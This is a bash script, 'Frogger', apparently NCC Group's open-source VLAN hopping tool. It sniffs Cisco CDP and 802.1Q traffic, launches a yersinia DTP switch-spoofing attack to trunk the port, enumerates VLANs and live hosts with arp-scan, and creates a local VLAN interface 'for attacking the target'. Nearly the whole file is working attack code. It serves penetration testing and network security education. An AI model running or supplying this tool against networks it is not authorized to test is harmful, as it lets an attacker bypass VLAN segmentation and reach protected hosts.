#!/usr/bin/env bash
# Frogger - The VLAN Hopper script
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 28/11/2012
# Requires arp-scan >= 1.8 for VLAN tagging, yersinia, tshark, vconfig and screen
# Tested on Bactrack 5 and Kali with Cisco devices - it can be used over SSH
# 1.4 changes - Speed improvements on CDP scanning made by Bernardo Damele.


#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/vlan-hopping

# https://github.com/nccgroup/vlan-hopping/wiki

#Released under AGPL see LICENSE for more information

######################################################################################

# User configuration Settings
TAGSEC="60" #change this value for the number of seconds to sniff for 802.1Q tagged packets
CDPSEC="60" # change this value for the number of seconds to sniff for CDP packets once verified CDP is on
DTPWAIT="20" # amount of time to wait for DTP attack via yersinia to trigger

# Variables needed throughout execution, do not touch
MANDOM=""
NATID=""
DEVID=""
MANIP=""
CDPON=""

# Script begins
#===============================================================================

VERSION="1.8"

ARPVER=$(arp-scan -V 2>&1 | grep "arp-scan [0-9]" |awk '{print $2}' | cut -d "." -f 1,2)
clear
echo -e "\033[0;31m########################################################\033[0m"
echo "***   Frogger - The VLAN Hopper Version $VERSION  ***"
echo ""
echo "***   Auto enumerates VLANs and device discovery ***"
echo -e "\033[0;32m########################################################\033[0m"
echo ""
echo "For usage information refer to the Wiki"
echo "https://github.com/nccgroup/vlan-hopping/wiki"
echo ""

# Check if we're root
if [[ $EUID -ne 0 ]]; then
        echo ""
        echo -e "\033[01;31m[!]\033[0m This program must be run as root. Run again with 'sudo'"
        echo ""
        exit 1
fi

#Check for yersinia
which yersinia >/dev/null
if [ $? -eq 1 ]
	then
		echo ""
		echo -e "\033[01;31m[!]\033[0m Unable to find the required Yersinia program, install and try again."
		exit 1
fi

#Check for tshark
which tshark >/dev/null
if [ $? -eq 1 ]
	then
		echo -e "\033[01;31m[!]\033[0m Unable to find the required tshark program, install and try again."
		echo ""
		exit 1
fi

#Check for screen
which screen >/dev/null
if [ $? -eq 1 ]
	then
		echo -e "\n\033[01;31m[!]\033[0m Unable to find the required screen program, install and try again.\n"
		exit 1
fi

#Check for arpscan
which arp-scan >/dev/null
if [ $? -eq 1 ]
	then
		echo -e "\033[01;31m[!]\033[0m Unable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com.\n"
		exit 1
else
	compare_arpscan=$(echo "$ARPVER < 1.8" | bc)
	if [ $compare_arpscan -eq 1 ] 
		then
			echo -e "\n\033[01;31m[!]\033[0m Unable to find version 1.8 of arp-scan, 1.8 is required for VLAN tagging. Install at least version 1.8 and try again. Download from www.nta-monitor.com."
			exit 1
	fi
fi


echo -e "\n\033[01;32m[-]\033[0m The following interfaces are available\n"
ifconfig | sed -n -e '/en[0-9]/,/status/ p'
#ifconfig | grep -o "en.*" |cut -d " " -f1
echo ""
echo -e "\033[1;31m----------------------------------------------------------\033[0m"
echo -e "\033[01;31m[?]\033[0m Enter the interface to scan from as the source"
echo -e "\033[1;31m----------------------------------------------------------\033[0m"
read INT
ifconfig | grep -i -w "$INT" >/dev/null

if [ $? = 1 ]
	then
		echo ""
		echo -e "\033[01;31m[!]\033[0m Sorry the interface you entered does not exist! - check and try again."
		echo ""
		exit 1
fi

echo ""
echo -e "\033[01;32m[-]\033[0m Now Sniffing CDP Packets on $INT - Please wait for "$CDPSEC" seconds."
echo ""
OUTPUT="`tshark -a duration:$CDPSEC -i $INT -Y \"cdp\" -V 2>&1 | sort --unique`"
printf -- "${OUTPUT}\n" | while read line
do
	case "${line}" in
			*captured*)
            if [ -n "$CDPON" ]
				then
					continue
            fi
			CDPON="`printf -- \"${line}\n\" | grep "0 packets"`"
			if [ "$CDPON" = "0 packets captured" ]
				then
					echo -e "\033[01;31m[!]\033[0m No CDP Packets were found, perhaps CDP is not enabled on the network. Try increasing the CDP time and try again"
					echo ""
					echo $CDPON >CDPONTMP
			fi		
			;;		
			VTP\ Management\ Domain:*)
            if [ -n "$MANDOM" ]
				then
					continue
            fi
			MANDOM="`printf -- \"${line}\n\" | cut -f2 -d\":\" |sed 's/^[ \t]*//;s/[ \t]*$//'`"
			if [ "$MANDOM" = "Domain:" ]
				then
					echo -e "\033[01;33m[!]\033[0m The VTP domain appears to be set to NULL on the device. Script will continue."
					echo ""
			elif [ -z "$MANDOM" ]
				then
					echo -e "\033[01;33m[!]\033[0m I didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue."
					echo ""
			else
				
				echo -e "\033[1;32m----------------------------------------------------------\033[0m"
				echo -e "\033[01;32m[+]\033[0m The following Management domains were found"
				echo -e "\033[1;32m----------------------------------------------------------\033[0m"
				#echo -e "\033[0;32m$MANDOM\033[0m"
				echo -e "\033[0;32m${line}\033[0m"
				echo ""			
			fi
			;;
		Native\ VLAN:*)
            if [ -n "$NATID" ]
				then
					continue
            fi
			NATID="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
			if [ -z "$NATID" ]
				then
					echo -e "\033[01;33m[!]\033[0m I didn't find any Native VLAN ID within CDP packets. Perhaps CDP is not enabled."
					echo ""
				else
					echo -e "\033[1;32m------------------------------------------------\033[0m"
					echo -e "\033[01;32m[+]\033[0m The following Native VLAN ID was found"
					echo -e "\033[1;32m------------------------------------------------\033[0m"
					echo -e "\033[0;32m$NATID\033[0m"
					echo ""
			fi
			
			;;
		*RELEASE\ SOFTWARE*)
            if [ -n "$DEVID" ]
            then
                continue
            fi
			DEVID="`printf -- \"${line}\n\" | awk '{sub(/^[ \t]+/, ""); print}'`"
			if [ -z "$DEVID" ]
				then
					echo -e "\033[01;33m[!]\033[0m I didn't find any devices. Perhaps it is not a Cisco device."
					echo ""
				else
					echo -e "\033[1;32m-----------------------------------------------------------------------------------------------------------\033[0m"
					echo -e "\033[01;32m[+]\033[0m The following Cisco device was found"
					echo -e "\033[1;32m-----------------------------------------------------------------------------------------------------------\033[0m"
					echo -e "\033[0;32m$DEVID\033[0m"
					echo ""
				
			fi
			
			;;
		IP\ address:*)
            if [ -n "$MANIP" ]
				then
					continue
            fi
			MANIP="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
			if [ -z "$MANIP" ]
				then
					echo -e "\033[01;31m[!]\033[0m I didn't find any management addresses within CDP packets. Try increasing the CDP time and try again."
					exit 1
				else
					echo -e "\033[1;32m-----------------------------------------------------------\033[0m"
					echo -e "\033[01;32m[+]\033[0m The following Management IP Addresses were found"
					echo -e "\033[1;32m-----------------------------------------------------------\033[0m"
					echo -e "\033[0;32m$MANIP\033[0m"
					echo $MANIP >MANIPTMP
					echo ""
			fi
			
			;;
	esac
done

# if CDP was not found, then exit script
cat CDPONTMP 2>&1 |grep "0 packets captured" >/dev/null
if [ $? = 0 ] 
	then
		rm CDPONTMP 2>/dev/null
		exit 1
	else
		rm CDPONTMP 2>/dev/null
fi

echo ""
echo -e "\033[01;32m[-]\033[0m Now Running DTP Attack on interface $INT, waiting "$DTPWAIT" seconds to trigger."
echo ""
echo "This might not work. try running 'sudo yersinia dtp -attack 1 -interface $INT' in a different window."
screen -d -m -S yersina_dtp sudo yersinia dtp -attack 1 -interface $INT
sleep $DTPWAIT
#clear

echo ""
echo -e "\033[01;32m[-]\033[0m Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for "$TAGSEC" seconds."
echo ""

VLANIDS=$(tshark -a duration:$TAGSEC -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique)

if [ -z "$VLANIDS" ]
	then
		echo -e "\033[01;31m[!]\033[0m I didn't find any VLAN IDs within 802.1Q tagged packets. Try increasing the tagged time (TAGSEC) and try again."
		echo ""
		exit 1
	else
		echo -e "\033[01;32m[+]\033[0m The following VLAN IDs were found"
		echo ""
		echo -e "\033[1;32m------------------------------------\033[0m"
		echo -e "\033[0;32m$VLANIDS\033[0m"
		echo -e "\033[1;32m------------------------------------\033[0m"
		echo ""
fi

SCANSDTP=$(cat MANIPTMP |cut -d "." -f 1,2,3)

echo -e "\033[1;31m------------------------------------------------------------------------------------------------------------------------\033[0m"
echo -e "\033[01;31m[?]\033[0m Enter the IP address or CIDR range you wish to scan for live devices in i.e 192.168.1.1 or 192.168.1.0/24"
echo ""
echo "Looking at the management address, try to scan "$SCANSDTP".0/24"
echo -e "\033[1;31m------------------------------------------------------------------------------------------------------------------------\033[0m"
read IPADDRESS

rm MANIPTMP 2>/dev/null
clear
for VLANIDSCAN in $(echo "$VLANIDS") 
do
	echo ""
	echo -e "\033[1;33m---------------------------------------------------------------------------------------\033[0m"
	echo -e "\033[01;32m[-]\033[0m Now scanning \033[0;32m$IPADDRESS - VLAN $VLANIDSCAN\033[0m for live devices"
	echo -e "\033[1;33m---------------------------------------------------------------------------------------\033[0m"
	echo ""
	arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 |grep "802.1Q VLAN="
	if [ $? = 0 ]
		then
			echo ""
			echo -e "\033[01;32m[+] Devices were found in VLAN "$VLANIDSCAN"\033[0m"
			
		else
			echo -e "\033[01;31m[!]\033[0m No devices found in VLAN "$VLANIDSCAN"."
	fi
done

#Menu choice for creating VLAN interface
echo ""
echo -e "\033[1;31m-----------------------------------------------------------------------------------------\033[0m"
echo -e "\033[01;31m[?]\033[0m Do you want to create a new interface in the discoved VLAN or Exit?"
echo -e "\033[1;31m-----------------------------------------------------------------------------------------\033[0m"
echo ""
echo " 1. Create a new local VLAN Interface for attacking the target"
echo ""
echo " 2. Exit script - this will kill all processes and stop the DTP attack"
echo ""
echo -e "\033[1;31m------------------------------------------------------------------------------------------\033[0m"
echo ""
read EXITMENU
	
	if [ "$EXITMENU" = "1" ]; then
			echo -e "\033[1;31m-----------------------------------------------\033[00m"
			echo -e "\033[01;31m[?]\033[00m Enter the VLAN ID to Create i.e 100"
			echo -e "\033[1;31m-----------------------------------------------\033[00m"
			read VID
			echo ""
			echo -e "\033[1;31m-------------------------------------------------------------------------------------------------------------\033[00m"
			echo -e "\033[01;31m[?]\033[00m Enter the IP address you wish to assign to the new VLAN interface $VID i.e 192.168.1.100/24"
			echo -e "\033[1;31m-------------------------------------------------------------------------------------------------------------\033[00m"
			read VIP

			networksetup -listdevicesthatsupportVLAN | grep $INT >/dev/null
			if [[ $? -ne 0 ]]; then
				echo -e "\n\033[01;31m[!]\033[0m The network interface you are using does not support VLAN tagging.\n"
				exit 1
			fi
			networksetup -listVLANs | grep "There are no VLANs currently configured on this system." >/dev/null
			if [ $? -eq 1 ]; then
				echo -e "\n\033[01;31m[!]\033[0m You already have some VLAN configured. Do the IP configuration yourself\n"
				ifconfig | sed -n -e '/vlan[0-9]/,/status/ p'
				echo -e "\nExiting...\n"
				exit 1
			fi
			networksetup -createVLAN vlan-frogger $INT $VID			
			ifconfig vlan0 up
			ifconfig vlan0 $VIP
			echo -e "\n\033[01;32m[+]\033[00m The following interface is now configured locally\n"
			echo -e "\033[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[00m"
			echo -e "\033[01;32m[+]\033[00m Interface \033[1;32mvlan0\033[00m with IP Address \033[1;32m$VIP\033[00m"
			echo -e "\033[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[00m\n"
				
	elif [ "$EXITMENU" = "2" ]; then
		ps -ef | grep "[Yy]ersinia dtp" >/dev/null
			if [ $? = 0 ]; then
					killall yersinia
					echo ""
					echo -e "\033[01;32m[+]\033[0m DTP attack has been stopped."
					echo ""
					exit 1
				else
					echo ""
					exit 1
			fi
fi
